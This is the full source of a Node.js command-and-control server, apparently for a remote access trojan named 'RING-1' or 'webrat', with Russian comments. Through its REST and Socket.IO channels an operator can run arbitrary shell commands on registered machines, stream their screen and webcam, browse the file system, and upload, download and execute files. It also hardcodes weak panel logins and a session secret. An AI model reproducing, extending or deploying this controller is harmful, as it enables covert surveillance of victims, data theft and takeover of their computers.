const express = require('express');
const session = require('express-session');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: '*', methods: ['GET', 'POST'] }, transports: ['websocket', 'polling'] });

const PORT = process.env.PORT || 3000;
const upload = multer({ dest: 'uploads/' });

const users = [
    { id: 1, username: 'admin', password: 'admin123' },
    { id: 2, username: 'root', password: 'root123' }
];

const computers = new Map(); // computerId -> { info, socketId }
const sessions = new Map(); // sessionId -> { computerId, type }
const pendingTransfers = new Map(); // для загрузки/скачивания файлов

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
    secret: 'ring1-webrat-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 3600000 }
}));

function requireAuth(req, res, next) {
    if (req.session.user) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
}

// === REST API ===

// Регистрация агента
app.post('/api/agent/register', (req, res) => {
    const { computerId, computerName, os, hostname, ip, username } = req.body;
    computers.set(computerId, {
        computerId,
        computerName: computerName || hostname,
        os,
        hostname,
        ip,
        username: username || 'unknown',
        lastSeen: new Date().toISOString(),
        status: 'online',
        socketId: null
    });
    console.log(`[REG] ${computerName} (${computerId})`);
    res.json({ success: true });
});

// Heartbeat
app.post('/api/agent/heartbeat', (req, res) => {
    const { computerId } = req.body;
    if (computers.has(computerId)) {
        const comp = computers.get(computerId);
        comp.lastSeen = new Date().toISOString();
        comp.status = 'online';
        computers.set(computerId, comp);
    }
    res.json({ success: true });
});

// Получение списка компьютеров
app.get('/api/computers', requireAuth, (req, res) => {
    const list = Array.from(computers.values()).map(c => ({
        computerId: c.computerId,
        computerName: c.computerName,
        os: c.os,
        ip: c.ip,
        username: c.username,
        status: c.status,
        lastSeen: c.lastSeen
    }));
    res.json(list);
});

// Удаление компьютера
app.delete('/api/computers/:id', requireAuth, (req, res) => {
    computers.delete(req.params.id);
    res.json({ success: true });
});

// === Управление через REST (команды) ===
app.post('/api/command/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const { command } = req.body;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const taskId = `cmd_${Date.now()}_${Math.random()}`;
        pendingTransfers.set(taskId, { type: 'command', computerId: id, res });
        io.to(computer.socketId).emit('execute_command', { command, taskId });
        
        setTimeout(() => {
            if (pendingTransfers.has(taskId)) {
                pendingTransfers.delete(taskId);
                res.status(408).json({ error: 'Timeout' });
            }
        }, 30000);
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// === Стриминг экрана (WebRTC) ===
app.post('/api/stream/screen/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const sessionId = `screen_${Date.now()}_${Math.random()}`;
        sessions.set(sessionId, { computerId: id, type: 'screen' });
        io.to(computer.socketId).emit('start_screen_stream', { sessionId });
        res.json({ sessionId });
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// === Стриминг вебкамеры ===
app.post('/api/stream/webcam/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const sessionId = `webcam_${Date.now()}_${Math.random()}`;
        sessions.set(sessionId, { computerId: id, type: 'webcam' });
        io.to(computer.socketId).emit('start_webcam_stream', { sessionId });
        res.json({ sessionId });
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// === Список файлов ===
app.post('/api/files/list/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const { path: dirPath } = req.body;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const taskId = `ls_${Date.now()}_${Math.random()}`;
        pendingTransfers.set(taskId, { type: 'filelist', computerId: id, res });
        io.to(computer.socketId).emit('list_files', { path: dirPath || 'C:\\', taskId });
        
        setTimeout(() => {
            if (pendingTransfers.has(taskId)) {
                pendingTransfers.delete(taskId);
                res.status(408).json({ error: 'Timeout' });
            }
        }, 15000);
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// === Загрузка файла на компьютер ===
app.post('/api/files/upload/:id', requireAuth, upload.single('file'), (req, res) => {
    const { id } = req.params;
    const { remotePath } = req.body;
    const computer = computers.get(id);
    
    if (computer && computer.socketId && req.file) {
        const fileData = fs.readFileSync(req.file.path);
        const base64 = fileData.toString('base64');
        fs.unlinkSync(req.file.path);
        
        const taskId = `up_${Date.now()}_${Math.random()}`;
        pendingTransfers.set(taskId, { type: 'upload', computerId: id, res });
        io.to(computer.socketId).emit('upload_file', {
            filename: req.file.originalname,
            path: remotePath || 'C:\\',
            data: base64,
            taskId
        });
        
        setTimeout(() => {
            if (pendingTransfers.has(taskId)) {
                pendingTransfers.delete(taskId);
                res.status(408).json({ error: 'Timeout' });
            }
        }, 60000);
    } else {
        res.status(404).json({ error: 'Computer offline or no file' });
    }
});

// === Скачивание файла с компьютера ===
app.post('/api/files/download/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const { filePath } = req.body;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const taskId = `down_${Date.now()}_${Math.random()}`;
        pendingTransfers.set(taskId, { type: 'download', computerId: id, res });
        io.to(computer.socketId).emit('download_file', { filePath, taskId });
        
        setTimeout(() => {
            if (pendingTransfers.has(taskId)) {
                pendingTransfers.delete(taskId);
                res.status(408).json({ error: 'Timeout' });
            }
        }, 60000);
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// === Запуск файла на компьютере ===
app.post('/api/files/execute/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const { filePath, args } = req.body;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const taskId = `exec_${Date.now()}_${Math.random()}`;
        pendingTransfers.set(taskId, { type: 'execute', computerId: id, res });
        io.to(computer.socketId).emit('execute_file', { filePath, args: args || '', taskId });
        
        setTimeout(() => {
            if (pendingTransfers.has(taskId)) {
                pendingTransfers.delete(taskId);
                res.status(408).json({ error: 'Timeout' });
            }
        }, 30000);
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// === Остановка стрима ===
app.post('/api/stream/stop/:sessionId', requireAuth, (req, res) => {
    const session = sessions.get(req.params.sessionId);
    if (session) {
        const computer = computers.get(session.computerId);
        if (computer && computer.socketId) {
            io.to(computer.socketId).emit('stop_stream');
        }
        sessions.delete(req.params.sessionId);
    }
    res.json({ success: true });
});

// === Аутентификация ===
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = users.find(u => u.username === username && u.password === password);
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    req.session.user = { id: user.id, username: user.username };
    res.json({ success: true });
});

app.get('/api/user', requireAuth, (req, res) => {
    res.json(req.session.user);
});

app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('/dashboard.html', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('*', (req, res) => {
    if (req.session.user) {
        res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'login.html'));
    }
});

// === Socket.IO ===
io.on('connection', (socket) => {
    console.log(`[SOCKET] Connected: ${socket.id}`);
    
    socket.on('agent_register', (data) => {
        const { computerId } = data;
        if (computers.has(computerId)) {
            const comp = computers.get(computerId);
            comp.socketId = socket.id;
            comp.status = 'online';
            computers.set(computerId, comp);
            console.log(`[AGENT] ${computerId} registered`);
        }
    });
    
    // === WebRTC сигналинг ===
    socket.on('webrtc_signal', (data) => {
        const { targetSessionId, signal } = data;
        io.to(`panel_${targetSessionId}`).emit('webrtc_signal', { signal, from: 'agent' });
    });
    
    socket.on('panel_signal', (data) => {
        const { computerId, signal } = data;
        const computer = computers.get(computerId);
        if (computer && computer.socketId) {
            io.to(computer.socketId).emit('webrtc_signal', { signal, from: 'panel' });
        }
    });
    
    socket.on('join_stream', (sessionId) => {
        socket.join(`panel_${sessionId}`);
        console.log(`[STREAM] Panel joined ${sessionId}`);
    });
    
    // === Результаты команд ===
    socket.on('command_result', (data) => {
        const { taskId, output, error } = data;
        if (pendingTransfers.has(taskId)) {
            const task = pendingTransfers.get(taskId);
            if (error) {
                task.res.status(500).json({ error });
            } else {
                task.res.json({ output });
            }
            pendingTransfers.delete(taskId);
        }
    });
    
    // === Результат списка файлов ===
    socket.on('filelist_result', (data) => {
        const { taskId, files, error } = data;
        if (pendingTransfers.has(taskId)) {
            const task = pendingTransfers.get(taskId);
            if (error) {
                task.res.status(500).json({ error });
            } else {
                task.res.json({ files });
            }
            pendingTransfers.delete(taskId);
        }
    });
    
    // === Результат загрузки ===
    socket.on('upload_result', (data) => {
        const { taskId, success, error } = data;
        if (pendingTransfers.has(taskId)) {
            const task = pendingTransfers.get(taskId);
            if (error) {
                task.res.status(500).json({ error });
            } else {
                task.res.json({ success });
            }
            pendingTransfers.delete(taskId);
        }
    });
    
    // === Результат скачивания ===
    socket.on('download_result', (data) => {
        const { taskId, data: fileData, filename, error } = data;
        if (pendingTransfers.has(taskId)) {
            const task = pendingTransfers.get(taskId);
            if (error) {
                task.res.status(500).json({ error });
            } else {
                task.res.json({ data: fileData, filename });
            }
            pendingTransfers.delete(taskId);
        }
    });
    
    // === Результат выполнения файла ===
    socket.on('execute_result', (data) => {
        const { taskId, output, error } = data;
        if (pendingTransfers.has(taskId)) {
            const task = pendingTransfers.get(taskId);
            if (error) {
                task.res.status(500).json({ error });
            } else {
                task.res.json({ output });
            }
            pendingTransfers.delete(taskId);
        }
    });
    
    socket.on('disconnect', () => {
        for (let [id, comp] of computers) {
            if (comp.socketId === socket.id) {
                comp.socketId = null;
                comp.status = 'offline';
                computers.set(id, comp);
                break;
            }
        }
        console.log(`[SOCKET] Disconnected: ${socket.id}`);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`[RING-1] Server running on port ${PORT}`);
});
